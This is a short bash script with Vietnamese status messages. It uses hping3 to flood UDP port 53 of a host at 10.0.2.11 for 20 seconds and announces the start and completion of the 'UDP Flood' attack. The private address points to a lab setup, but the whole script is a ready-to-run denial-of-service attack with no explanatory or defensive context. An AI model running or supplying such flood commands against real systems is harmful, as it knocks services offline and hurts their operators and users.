#!/bin/bash
VICTIM=10.0.2.11
DURATION=20
echo "Bat dau UDP Flood vao $VICTIM trong $DURATION giay..."
timeout $DURATION hping3 --udp -p 53 --flood $VICTIM
echo "Hoan tat tan cong UDP Flood!"
